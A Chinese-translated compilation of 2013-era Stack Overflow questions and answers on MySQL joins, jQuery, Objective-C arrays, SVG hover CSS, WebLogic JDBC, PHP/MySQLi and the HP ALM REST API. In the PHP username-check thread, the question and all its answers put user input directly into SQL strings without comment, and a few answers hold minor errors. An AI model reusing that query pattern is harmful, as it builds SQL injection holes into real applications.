Image Resizer 仍然使用 web.config。所以你不能去 ServiceConfiguration 配置文件。仅当 Image Resizer 具有用于配置的编程 API 时，您才能使用云服务配置文件。然后，您可以使用该 API 从 Cloud Configuration 中提取配置设置。但是 web.config 转换有什么问题呢？无论如何，您都将使用云配置进行部署。我不认为您使用本地配置进行部署，并且在服务运行后您就去更改门户中的配置（或使用管理 API）...

# mysql - mysql中3个表的内连接

> ID：16013364
> 
> 赞同：37
> 
> 时间：2013-04-15T10:52:45.540
> 
> 标签：mysql, database, inner-join

我想使用内连接从更多表中选择数据。

这些是我的桌子。

```
Student (studentId, firstName, lastname)
Exam (examId, name, date)
Grade (gradeId, fk_studentId, fk_examId, grade) 
```

我想写一份声明，说明学生参加过的考试、年级和日期。按日期排序。

这是我的声明。它运行，但我想确保我做得正确。

```
SELECT
  student.firstname,
  student.lastname,
  exam.name,
  exam.date,
  grade.grade
FROM grade
  INNER JOIN student
    ON student.studentId = grade.gradeId
  INNER JOIN exam
    ON exam.examId = grade.gradeId
ORDER BY exam.date 
```

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2013-04-15T10:57:58.947

几乎正确..查看连接，您指的是错误的字段

```
SELECT student.firstname,
       student.lastname,
       exam.name,
       exam.date,
       grade.grade
  FROM grade
 INNER JOIN student ON student.studentId = grade.fk_studentId
 INNER JOIN exam ON exam.examId = grade.fk_examId
 ORDER BY exam.date 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-04-15T10:56:55.553

正确的说法应该是：

```
SELECT
  student.firstname,
  student.lastname,
  exam.name,
  exam.date,
  grade.grade
FROM grade
  INNER JOIN student
    ON student.studentId = grade.fk_studentId
  INNER JOIN exam
    ON exam.examId = grade.fk_examId
ORDER BY exam.date 
```

根据定义的外键关系引用其他表。如果您希望数据显示为已查询，则应正确引用 ID。因此，您应该将 id 引用到表中正确的外键，而不仅仅是没有定义正确关系的 id

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-15T11:02:07.320

```
SELECT
  student.firstname,
  student.lastname,
  exam.name,
  exam.date,
  grade.grade
FROM grade
 INNER JOIN student
   ON student.studentId = grade.fk_studentId
 INNER JOIN exam
   ON exam.examId = grade.fk_examId
 GROUP BY grade.gradeId
 ORDER BY exam.date 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-08-11T16:11:54.387

更专业的代码编写方式是使用“别名”——

```
SELECT
  s.firstname,
  s.lastname,
  e.name,
  e.date,
  g.grade
FROM grade AS g
 INNER JOIN student AS s
   ON s.studentId = g.fk_studentId
 INNER JOIN exam AS e
   ON e.examId = g.fk_examId
 ORDER BY e.date; 
```

# openshift - Google Cloud Messaging 是否有任何原因无法在 Openshift 等第三方服务器主机上运行？

> ID：16013367
> 
> 赞同：1
> 
> 时间：2013-04-15T10:52:49.350
> 
> 标签：openshift, google-cloud-messaging

计划在 OpenShift 上用 Java 构建后端，并且需要使用 GCM 向设备发送消息。与使用 AppEngine 相比，这是否是一个坏主意？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-25T06:55:55.413

后端（在[文档中称为](http://developer.android.com/google/gcm/gcm.html#server)**3rd-party Application Server** ）不必在 Google App Engine 上运行。

我在 Ubuntu Linux 系统上的 GlassFish v3 上运行服务器，并且与 GCM 的通信运行良好。可以使用 Android 模拟器在 GlassFish 的本地安装上进行测试 - 只要本地机器可以访问 Internet（对于 GCM 的 HTTP 请求）。

# jquery - 将输入属性更改绑定到 DOM 中的新元素

> ID：16013368
> 
> 赞同：0
> 
> 时间：2013-04-15T10:52:50.097
> 
> 标签：jquery, dom

我有多个输入框（实际上它们的 type="number"）。在页面加载后将其加载到 DOM 中，我需要将它们绑定到输入属性更改。

```
$('.edit-quantity').bind('input propertychange', function(e){
    ...
}); 
```

当元素在页面加载时呈现但不在注入 DOM 的任何新元素上呈现时，此方法有效。

我不能使用`.keyup()`，`.on()`因为它是一个 html5 输入类型编号，它添加了这些也可以更改属性的小向上/向下箭头。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:01:23.453

弄清楚了：

```
$('body').on('input propertychange', '.edit-quantity', function(e){
    ...
}); 
```

这似乎运作良好

# ios - 如何在一个 NSMutableArray 中添加对象多 NSArray

> ID：16013370
> 
> 赞同：8
> 
> 时间：2013-04-15T10:52:55.463
> 
> 标签：ios, objective-c, nsmutablearray, nsarray

我想将对象从 2 NSArray 添加到 NSMutableArray。我不知道这件事。

这是我的代码：

```
@interface ViewController : UITableViewController
{
    NSArray *animal;
    NSArray *color;
    NSMutableArray *all;
}

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];

    animal = [[NSArray alloc]initWithObjects:@"Lion",@"Tiger",@"Dog",@"Cat",@"Sheep",@"Wolf", nil];
    color = [[NSArray alloc]initWithObjects:@"Blue",@"Red",@"Yellow",@"Green",@"Black", nil];

    all = ??? ; //how to add object from animal and color array in all 
} 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-15T10:55:36.290

您可以使用[addObjectsFromArray:](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSMutableArray_Class/Reference/Reference.html)从[NSMutableArray](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSMutableArray_Class/Reference/Reference.html)类

```
all = [[NSMutableArray alloc]init];
[all addObjectsFromArray:animal];
[all addObjectsFromArray:color]; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-15T10:55:53.617

尝试这个：

```
animal = [[NSArray alloc]initWithObjects:@"Lion",@"Tiger",@"Dog",@"Cat",@"Sheep",@"Wolf", nil];
color = [[NSArray alloc]initWithObjects:@"Blue",@"Red",@"Yellow",@"Green",@"Black", nil];

all = [[NSMutableArray alloc] init];
[all addObjectsFromArray:animal];
[all addObjectsFromArray:color]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-08-17T08:51:31.140

我正在使用这个：

> ```
> all = @[animal, color]; 
> ```

但是您必须将数组 "all" 从 转换`NSMutableArray`为`NSArray`.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-05-12T12:18:49.317

**all** = [[ **all** arrayByAddingObjectsFromArray: **animal** ] mutableCopy];
**all** = [[ **all** arrayByAddingObjectsFromArray: **color** ] mutableCopy];

# jquery - jquery按id显示/隐藏多个元素

> ID：16013383
> 
> 赞同：2
> 
> 时间：2013-04-15T10:54:10.217
> 
> 标签：jquery, click, hide, show

我有 3 个段落和 2 个按钮，它们是下一个/上一个。在初始加载时，用户只能看到第一段和下一个按钮，除非他在第 2 段上，否则在最后一段上会有下一个和上一个按钮，只有上一个按钮。这总结了我所做的。

除了后退按钮之外，我的代码可以正常工作，但我真正想要的是一种更清洁/更好的方式来做同样的事情。

我的html在这里：

```
<p id="page-1" class="ui-bottom-article">
blah blah blah 1
<p id="page-2" class="ui-bottom-article">
blah blah blah 2
</p>
<p id="page-3" class="ui-bottom-article">
blah blah blah 3
</p>

<a id="rd_bk" href="">back</a><a id="rd_more" href="">Read more...</a> 
```

我的脚本

```
$(function() {

     var pageNumber = 1;
         $('p.ui-bottom-article').hide();
         $('#page-1').show();
         $('#rd_bk').hide();

    $('#rd_more, #rd_bk').click(function(e){
        e.preventDefault();

     if(pageNumber == 1){
         $('p.ui-bottom-article').hide();
         $('#page-2').show();
          $('#rd_bk').show();
        pageNumber++;

        }else if(pageNumber == 2){
         $('p.ui-bottom-article').hide();
         $('#page-3').show();
         $('#rd_more').hide();
         $('#rd_bk').show();

        }else if(pageNumber == 3){
         $('p.ui-bottom-article').hide();
         $('#page-1').show();
         $('#rd_more').hide();
        pageNumber--;
        }

    }//end of if statement
    );//end of click function

}); // end of function 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:28:50.787

我想你是在这个之后：

```
$(function(){
    $('p.ui-bottom-article').hide(); // all p hidden here
    $('#page-1').show(); // first of it shown
    $('#rd_bk').hide(); // back btn hidden by default

    $('#rd_more').on('click', function (e) {
        e.preventDefault(); // prevent the default behavior of <a>
        $('p:visible').next('p[id^="page-"]').show().siblings('p').hide(); // show the next of the visible page in this case its page-2 is the next one
        ($('p[id^="page-"]').last().is(':visible')) ? $('#rd_more').hide().addBack('#rd_bk').show() : $('#rd_bk').show(); // show hide the next prev btns
    });

    $('#rd_bk').on('click', function (e) {
        e.preventDefault();
        $('p:visible').prev('p[id^="page-"]').show().siblings('p').hide(); // show the prev hidden div and hide the visible one
        ($('p[id^="page-"]').first().is(':visible')) ? $('#rd_bk').hide().addBack('#rd_more').show() : $('#rd_more').show(); // show hide the next prev btns
    });
}); 
```

### [更新小提琴](http://jsfiddle.net/ApQ4d/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:07:21.683

您应该使用 jquery 的 prev 和 next 选择器进行枚举。

这可能是下一个和上一个按钮的代码：

```
$('#rd_more').click(function()
{
    var next = $('.ui-bottom-article:visible').hide().next('.ui-bottom-article').show();
    if($(next).next('.ui-bottom-article').length == 0)
        $('#rd_more').hide();
    else
        $('#rd_more').show();
});

$('#rd_bk').click(function()
{
    var prev = $('.ui-bottom-article:visible').hide().prev('.ui-bottom-article').show();
    if($(prev).prev('.ui-bottom-article').length == 0)
        $('#rd_bk').hide();
    else
        $('#rd_bk').show();
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T11:25:35.623

我会做这样的事情：

```
(function($) {
  var paras,
      buttons,
      currPara = 0;

  function init() {
    paras = $('.ui-bottom-article');
    buttons = $('#rd_bk, #rd_more');
    buttons.back = buttons.eq(0);
    buttons.more = buttons.eq(1);

    buttons.on('click', buttonClick);
    updateUI();
  }

  function buttonClick(e) {
    // currPara is decreased if we're clicking
    // back or increased if we're clicking more
    currPara += (this === buttons.back[0]) ? -1 : 1;
    updateUI();
    e.preventDefault();
  }

  function updateUI() {
    paras.hide().eq(currPara).show();
    buttons.back.toggle(currPara !== 0);
    buttons.more.toggle(currPara < (paras.length-1));
  }

  // on DOM ready.
  // start 'er up    
  $(init);
}(jQuery)); 
```

**[演示](http://jsfiddle.net/WMcd8/2/)**

# ios - 如何在 iOS 中创建和检索新的位图

> ID：16013390
> 
> 赞同：1
> 
> 时间：2013-04-15T10:54:37.993
> 
> 标签：ios, objective-c, uiimage, bitmapimage, bitmapdata

我想将图像从一种格式（.png）转换为其他图像格式（.img 格式）。我能够检索和修改相同图像格式的 rgba 值。是否需要做任何其他事情才能将其转换为其他图像格式？

我创建了一个空位图并想绘制该位图的图像。

```
CGImageRef cgimage = image.CGImage;

size_t width  = CGImageGetWidth(cgimage);
size_t height = CGImageGetHeight(cgimage);

size_t bytesPerRow = CGImageGetBytesPerRow(cgimage);
size_t bytesPerPixel = CGImageGetBitsPerPixel(cgimage);
size_t bitsPerComponent = CGImageGetBitsPerComponent(cgimage);
size_t bytes_per_pixel = bytesPerPixel / bitsPerComponent;

CGBitmapInfo bitmapInfo = CGImageGetBitmapInfo(cgimage);

CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
unsigned char *rawData = malloc(height * width * 4);
memset(rawData, 0, height * width * 4);

CGContextRef context = CGBitmapContextCreate(rawData, width, height, bitsPerComponent, bytesPerRow, colorSpace, bitmapInfo);

CGContextDrawImage(context, CGRectMake(0, 0, width, height), image.CGImage); 
```

iOS 中是否有任何函数可以用修改后的 rgba 值填充输出位图。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:15:38.557

它看起来像这样：

```
UIImage *image = self.theImage;
CGImageRef imageRef = [image CGImage];
NSUInteger width = CGImageGetWidth(imageRef);
NSUInteger height = CGImageGetHeight(imageRef);
CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
NSMutableData *data = [[NSMutableData alloc] initWithCapacity:height * width * 4];
unsigned char *rawData = data.mutableBytes;
NSUInteger bytesPerPixel = 4;
NSUInteger bytesPerRow = bytesPerPixel * width;
NSUInteger bitsPerComponent = 8;
CGContextRef context = CGBitmapContextCreate(rawData, width, height,
                                             bitsPerComponent, bytesPerRow, colorSpace,
                                             kCGImageAlphaPremultipliedLast | kCGBitmapByteOrder32Big);
CGColorSpaceRelease(colorSpace);

CGContextDrawImage(context, CGRectMake(0, 0, width, height), imageRef);
CGContextRelease(context);

int byteIndex = (bytesPerRow * 0) + 0 * bytesPerPixel; 
```

如果要操作数据，请遍历`byteIndex`. 希望这就是你要找的。

# html - SVG 多边形的 CSS 鼠标悬停

> ID：16013398
> 
> 赞同：0
> 
> 时间：2013-04-15T10:55:05.323
> 
> 标签：html, css, xml, svg

我正在尝试使用 css 将鼠标悬停规则分配给 svg 多边形，但我无法让它工作。

这是我的svg：

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->

<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   width="249.8125"
   height="247.1875"
   id="svg2"
   version="1.1"
   inkscape:version="0.48.4 r9939"
   sodipodi:docname="Nuovo documento 1">
  <defs id="defs4" >
      <link href="style.css" type="text/css" rel="stylesheet" 
      xmlns="http://www.w3.org/1999/xhtml"/>
  </defs>
  <sodipodi:namedview
     id="base"
     pagecolor="#ffffff"
     bordercolor="#666666"
     borderopacity="1.0"
     inkscape:pageopacity="0.0"
     inkscape:pageshadow="2"
     inkscape:zoom="0.35"
     inkscape:cx="335.6875"
     inkscape:cy="177.67353"
     inkscape:document-units="px"
     inkscape:current-layer="layer1"
     showgrid="false"
     fit-margin-top="0"
     fit-margin-left="0"
     fit-margin-right="0"
     fit-margin-bottom="0"
     inkscape:window-width="518"
     inkscape:window-height="423"
     inkscape:window-x="100"
     inkscape:window-y="100"
     inkscape:window-maximized="0" />
  <metadata
     id="metadata7">
    <rdf:RDF>
      <cc:Work
         rdf:about="">
        <dc:format>image/svg+xml</dc:format>
        <dc:type
           rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
        <dc:title></dc:title>
      </cc:Work>
    </rdf:RDF>
  </metadata>
  <g
     inkscape:label="Livello 1"
     inkscape:groupmode="layer"
     id="layer1"
     transform="translate(-39.3125,-348.5625)">
    <path
       style="fill:#000000;stroke:#000000;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
       d="m 65.714286,509.50504 214.285714,-160 8.57143,91.42857 -57.14286,8.57143 0,80 L 160,520.93361 125.71429,595.21933 40,583.79075 z"
       id="path2985"
       inkscape:connector-curvature="0" />
  </g>
</svg> 
```

这是 style.css：

```
#path2985:hover{
    display:none;
} 
```

在我的 html 页面中，我看到了我的 svg，但是在鼠标悬停时它并没有消失。

如果我在谷歌浏览器上打开“检查元素”选项卡并将`:hover`属性分配给`#path2985`它就会消失，所以我确定正在加载样式表。

为什么鼠标悬停时多边形没有消失？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:09:49.000

删除`display: hidden;`. 用于`fill-opacity`隐藏信息，直到您悬停，就像这样；

```
<path
       style="fill:#000000;fill-opacity: 0.0;fillstroke:#000000;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
       d="m 65.714286,509.50504 214.285714,-160 8.57143,91.42857 -57.14286,8.57143 0,80 L 160,520.93361 125.71429,595.21933 40,583.79075 z"
       id="path2985"
       inkscape:connector-curvature="0" /> 
```

其余详细信息在原始问题的评论部分。

# java - 使用使用 type3 驱动程序的 weblogic 服务器的 Java 数据库连接

> ID：16013401
> 
> 赞同：0
> 
> 时间：2013-04-15T10:55:16.523
> 
> 标签：java, oracle, jdbc, weblogic

在这里，我正在使用 weblogic 服务器和 oracle 数据库使用 type3 驱动程序进行数据库连接。

我在运行代码时遇到了这个错误

```
E:\abhishek\D drive\abhishek\advance\jdbc>java Type3oracle
Exception in thread "main" java.sql.SQLException: getConnection, Exception = Une
xpected Exception
        at weblogic.jdbc.rmi.RMIWrapperImpl.invocationExceptionHandler(RMIWrappe
rImpl.java:102)
        at weblogic.jdbc.rmi.Driver.connect(Driver.java:182)
        at Type3oracle.main(Type3oracle.java:21)
Caused by: weblogic.rmi.extensions.RemoteRuntimeException: Unexpected Exception
        at weblogic.jdbc.common.internal.RmiDataSource_1030_WLStub.getConnection
(Unknown Source)
        at weblogic.jdbc.rmi.Driver.connect(Driver.java:168)
        ... 1 more
Caused by: java.rmi.UnmarshalException: Could not unmarshal method ID; nested ex
ception is:
        java.rmi.UnmarshalException: Method not found: 'createQueryObject(Ljava.
lang.Class<LT;>;)'
        at weblogic.rjvm.ResponseImpl.unmarshalReturn(ResponseImpl.java:234)
        at weblogic.rmi.cluster.ClusterableRemoteRef.invoke(ClusterableRemoteRef
.java:348)
        at weblogic.rmi.cluster.ClusterableRemoteRef.invoke(ClusterableRemoteRef
.java:259)
        ... 3 more
Caused by: java.rmi.UnmarshalException: Method not found: 'createQueryObject(Lja
va.lang.Class<LT;>;)'
        at weblogic.rmi.internal.MethodDescriptor.getCanonical(MethodDescriptor.
java:197)
        at weblogic.rjvm.MsgAbbrevInputStream.getRuntimeMethodDescriptor(MsgAbbr
evInputStream.java:495)
        at weblogic.rmi.internal.BasicServerRef.dispatch(BasicServerRef.java:269
)
        at weblogic.rmi.cluster.ClusterableServerRef.dispatch(ClusterableServerR
ef.java:242)
        at weblogic.rjvm.RJVMImpl.dispatchRequest(RJVMImpl.java:1135)
        at weblogic.rjvm.RJVMImpl.dispatch(RJVMImpl.java:1017)
        at weblogic.rjvm.ConnectionManagerServer.handleRJVM(ConnectionManagerSer
ver.java:240)
        at weblogic.rjvm.ConnectionManager.dispatch(ConnectionManager.java:882)
        at weblogic.rjvm.MsgAbbrevJVMConnection.dispatch(MsgAbbrevJVMConnection.
java:453)
        at weblogic.rjvm.t3.MuxableSocketT3.dispatch(MuxableSocketT3.java:322)
        at weblogic.socket.AbstractMuxableSocket.dispatch(AbstractMuxableSocket.
java:394)
        at weblogic.socket.NTSocketMuxer.processSockets(NTSocketMuxer.java:105)
        at weblogic.socket.SocketReaderRequest.run(SocketReaderRequest.java:29)
        at weblogic.socket.SocketReaderRequest.execute(SocketReaderRequest.java:
42)
        at weblogic.kernel.ExecuteThread.execute(ExecuteThread.java:145)
        at weblogic.kernel.ExecuteThread.run(ExecuteThread.java:117) 
```

这是我的代码

```
import java.sql.*;
import java.util.*;
//weblogic.jar must be in the classpath and datasource with the specified name must be created and deployed and application server must be running

//type 3 driver

class Type3oracle
{
public static void main(String args[])throws Exception
{
Driver mydriver=(Driver)Class.forName("weblogic.jdbc.rmi.Driver").newInstance();

String url= "jdbc:weblogic:rmi";

Properties props =new Properties();
props.put("weblogic.server.url","t3://localhost:7001");
props.put("weblogic.jdbc.datasource","type3oracle");
//type3oracle is jndi name
Connection con=  mydriver.connect(url,props);
Statement stmt = con.createStatement();
ResultSet rset=stmt.executeQuery("select * from student1");
while(rset.next())
{
System.out.println(rset.getString(1));
}

}
} 
```

请帮助我，我想运行这个程序来连接到数据库 xe 中存在的我的表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-10T11:48:02.403

使用 JNDI 查找数据源，然后远程 getConnection()，这将为您提供 type3 连接。

# php - PHP MySQLi jQuery检查数据库值不存在

> ID：16013407
> 
> 赞同：0
> 
> 时间：2013-04-15T10:55:53.343
> 
> 标签：php, jquery, mysqli

我正在使用下面的 PHP 和 jQuery 脚本，我正在尝试检查数据库中是否不存在通过的用户名。

**PHP**

```
 if(mysqli_query($con, "SELECT id FROM user WHERE user_name='$username'")){
            echo '1'; //If there is a  record match in the Database - Not Available
        } else {
            echo '0'; //No Record Found - Username is available 
        }
    }
?> 
```

**jQuery**

```
$(document).ready(function(){
    $("fieldset input[name=username]").change(function(){
        var username = $("fieldset input[name=username]").val();//Get the value in the username textbox
        if(username.length > 3){
            $(".username_status").html('<img src="loader.gif" align="absmiddle">&nbsp;Checking availability...');
            $.ajax({
                type: "POST",  
                url: "/donald/settings/check-username.php",  //file name
                data: "username="+ username,  //data
                success: function(data){
                    console.log("server_response: "+data);
                    if(data == '0'){
                        $(".username_status").html('<font color="Green"> Available </font>');
                    } else  if(data == '1'){  
                        $(".username_status").html('<font color="red">Not Available </font>');
                    }
                } 
            }); 
        } else {
            $(".username_status").html('<font color="#cc0000">Username too short</font>');
        }
        return false;
    });
}); 
```

结果总是通过`1`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T10:58:08.887

如果您查看[`mysqli_query()`](http://php.net/manual/en/mysqli.query.php)文档：

> > > 失败时返回 FALSE。对于成功的 SELECT、SHOW、DESCRIBE 或 EXPLAIN 查询，mysqli_query() 将返回一个 mysqli_result 对象。对于其他成功的查询，mysqli_query() 将返回 TRUE。

因此，对于有效查询，它永远不应该返回`FALSE`。因此，您可能想要这样做，使用[`mysqli_result`](http://www.php.net/manual/en/class.mysqli-result.php)：

```
$q = mysqli_query($con, "SELECT id FROM user WHERE user_name='$username'");
if( $q && $q->num_rows ){
    echo '1';
} else {
    echo '0';
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:01:24.310

您应该改为检查[mysqli_num_rows](http://php.net/manual/en/mysqli-result.num-rows.php)。 如果执行查询，[mysqli_query总是返回 true](http://php.net/manual/en/mysqli.query.php)

尝试将php代码更改为

```
$resource = mysqli_query($con, "SELECT id FROM user WHERE user_name='$username'");
$rowCount = mysqli_num_rows($resource);  
 if($rowCount > 0){
        echo '1'; //If there is a  record match in the Database - Not Available
    } else {
        echo '0'; //No Record Found - Username is available 
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T10:57:39.723

mysqli_query() 每次有正确的查询时都会返回 true，无论其结果如何。您需要使用另一个 mysqli_ 函数，该函数将返回行，即 mysqli_num_rows、_result 或 _fetch_array。

当然，它们每个都有自己的语法，因此您必须检查并正确使用它才能检查是否有结果。即如果 num_rows>0 或 result($query, 0)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-15T10:59:22.483

`(mysqli_query($con, "SELECT id FROM user WHERE user_name='$username'"))`如果查询正常，将始终评估为 true。这不是你想要的。

# php - HP ALM REST API 使用 Curl 和 PHP 使用 PUT 方法发送 xml 数据

> ID：16013413
> 
> 赞同：1
> 
> 时间：2013-04-15T10:56:22.083
> 
> 标签：php, xml, rest, curl

我正在尝试使用`REST API`through `Curl`&更新 ALM 中的测试数据`PHP`。

```
Step 1 : Check Lock Status => GET method | response => UNLOCKED

Step 2 : Acquire Lock => POST method | response <entity data XML>

Step 3 : Check Lock Status => GET method | response LOCKED_BY_ME

Step 4 : Checkout Versions | Optional

Step 5 : Update data => PUT method | response = http_code = 200 OK 
```

在第 3 步之前工作正常，跳过第 4 步。

我成功了，直到第 3 步，我得到的响应为`LOCKED_BY_ME`. 第 4 步我跳过了，因为我们没有版本控制概念。其中第 5 步，当我绑定发送 xml 数据时出现错误`415 (Unsupported Media)`，我相信这是因为 ALM 服务器无法识别我发送的数据。我通过发送“<code>Associative array/XMl/JSON”来尝试它，但我得到的状态码是 415。

这是我的代码。

**代码**

```
$url="http://{Host:port}/qcbin/rest/domains/{domainname}/projects/{Projectname}/tests/{id}/lock";

function update_tests()
{

    $qc=$this->curl_auth();
    $headers = array("DELETE /HTTP/1.1","Content-Type:text/xml");
curl_setopt($qc, CURLOPT_TIMEOUT, $timeout);
curl_setopt($qc, CURLOPT_URL, $url);
    curl_setopt($qc, CURLOPT_RETURNTRANSFER, true);
curl_setopt($qc, CURLOPT_COOKIESESSION, true);
curl_setopt($qc, CURLOPT_COOKIEJAR,BASEPATH .'cookie.txt');
$res_unlock=curl_exec($qc);
    $resp=curl_getinfo($qc);

    $xml=simplexml_load_string(curl_exec($qc));

    if($xml->LockStatus == 'LOCKED_BY_OTHER' || $xml->LockStatus == 'LOCKED_BY_ME')
{
    $headers = array(
        'Accept: application/xml',
        'Content-Type: application/xml',
    );

    $data= <<<XML
<Entity Type="test">
<Fields>
<Field Name="Name">
<Value>Name of the test</Value> 
</Field>
<Field Name="Status">
<Value>Updated Value</Value>
</Field>
</Fields>
</Entity>
XML;

        curl_setopt($qc, CURLOPT_URL, $url);
        curl_setopt($qc, CURLOPT_HTTPHEADER, $header);
    curl_setopt($qc, CURLOPT_HEADER, 1);
    curl_setopt($qc, CURLOPT_PUT, 1);
    curl_setopt($qc, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_setopt($qc, CURLOPT_POSTFIELDS, $data);
    curl_setopt($qc, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($qc);
    $resp=curl_getinfo($qc);
}
else
{
        $data='';
        curl_setopt($qc, CURLOPT_URL, $url);

    curl_setopt($qc, CURLOPT_HEADER, true);
    curl_setopt($qc, CURLOPT_POST, 1);
    curl_setopt($qc, CURLOPT_POSTFIELDS, $data);
    $res_Lock=curl_exec($qc);
        $resp=curl_getinfo($qc);

        if($resp['http_code'] == 200)
        {
        $headers = array(
           'Accept: application/xml',
           'Content-Type: application/xml',
        );

        $file = BASEPATH."tests.xml";
        $data= <<<XML
<Entity Type="test">
<Fields>
<Field Name="Name">
<Value>Name of the test</Value> 
</Field>
<Field Name="Status">
<Value>Updated Value</Value> 
</Field>
</Fields>
</Entity>
XML;

           curl_setopt($qc, CURLOPT_URL, $url);
               curl_setopt($qc, CURLOPT_HTTPHEADER, $header);
           curl_setopt($qc, CURLOPT_HEADER, 1);
           curl_setopt($qc, CURLOPT_PUT, 1);
           curl_setopt($qc, CURLOPT_CUSTOMREQUEST, "PUT");
           curl_setopt($qc, CURLOPT_POSTFIELDS, $data);
           curl_setopt($qc, CURLOPT_RETURNTRANSFER, 1);
           $result = curl_exec($qc);
           $resp=curl_getinfo($qc);
        }
    }
} 
```

我明白`415 Error`了，我无法使用`PUT`方法发送数据。感谢您的帮助。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-06T18:23:02.863

您应该将 CURLOPT_INFILE 与 PUT 操作一起使用。POSTFIELDS 用于 POST 操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-11T15:42:56.473

在上面，看起来您的 HTTP 标头位于变量 $headers 中，但您正在从 $header 设置 HTTP 标头的 curl 选项。

我今天一直在为 HP ALM 的类似问题而苦苦挣扎。当我 100% 确定正在设置以下标头时，一切都开始正常工作：

内容类型：application/xml 接受：application/xml

要使 HP ALM 界面正常工作，似乎需要做三件事：

1.  URL - 显然
2.  http 标头 - 几乎还不够好
3.  有效载荷 - 从上面看

文档[https://almelsevier.saas.hp.com/qcbin/Help/doc_library/api_refs/REST/webframe.html](https://almelsevier.saas.hp.com/qcbin/Help/doc_library/api_refs/REST/webframe.html)几乎可以接受。

# mysql - 多个线程可以操作同一个数据库吗？

> ID：16013418
> 
> 赞同：1
> 
> 时间：2013-04-15T10:56:33.990
> 
> 标签：mysql, database, pthreads, threadpool

我无法理解的场景：

一个名为 DBserver 的进程有五个线程，每个线程都有一个与 Mysql 数据库的连接。每次我们要执行一条sql，我们将它发送给DBserver，然后DBserver会选择一个线程来执行。现在来了两条sql，分别叫sqlA和sqlB，sqlA在sqlB之前，但是由于DBserver使用多线程，不能保证sqlA先于sqlB执行。如果 sqlB 真的在 sqlA 之前执行，我认为会发生错误。

例如：

```
sqlA:update bankTable set money = 10 where id = 10001;

sqlB:update bankTable set money = 100 where id = 10001; 
```

如果sqlB在sqlA之前执行，最后钱是10，应该是100。但是这个DBserver已经上线，没有出现任何错误，我不知道为什么。非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:04:23.363

为什么会出现错误？你的意思是说，这不是你期望发生的。就这样。但是这两个查询都可以按任何顺序执行，而不会出错。

对于这个例子，我假设 sqlA 总是在 sqlB 之前执行，因为两个查询中的工作是相同的，主线程会将查询传递给空闲线程。

但如果我们谈论更复杂的查询：我想这就是表锁定发挥作用的地方。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:12:15.710

看来您想要的是保留 ACID 合规性，同时仍抽象单个 SQL 查询。

我的建议是构建一个接受 SQL 查询的类，以接受单个 SQL 查询（如字符串）或 SQL 查询列表。该列表意味着查询是相互依赖的，需要在同一个数据库连接上运行。

这在使用临时表时尤其重要，因为它们的范围仅限于数据库连接并且对其他连接保持不可见。

# css - 如何告诉 CSS 在某些图像周围设置边框，而不是其他？

> ID：16013423
> 
> 赞同：3
> 
> 时间：2013-04-15T10:56:51.093
> 
> 标签：css, border

使用 HTML 边框属性很容易，但现在它们已经消失了。

我所发现的只是关于 CSS 对边框所做的奇妙事情的很多东西。但是我如何告诉它打开某些图像（图片）的边框，而不是其他图像（图标）？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-15T10:59:43.353

标记应该与类有边框的那些：

```
<img class='picture' ...> 
```

然后使用 CSS 添加边框：

```
.picture {
    border: 1px solid green;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:00:41.620

您可以为图像设置样式，如下所示：

```
<img src="yourimage.jpg">
img {border:2px dotted blue;} 
```

并为其他图像（如图标）设置一个唯一的类，如下所示：

```
<img src="youricon.jpg" class="noborder">
img.noborder {border:none;} 
```

无论如何，您必须在两个图像之间做出区别，以便 css 相互识别。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:01:11.597

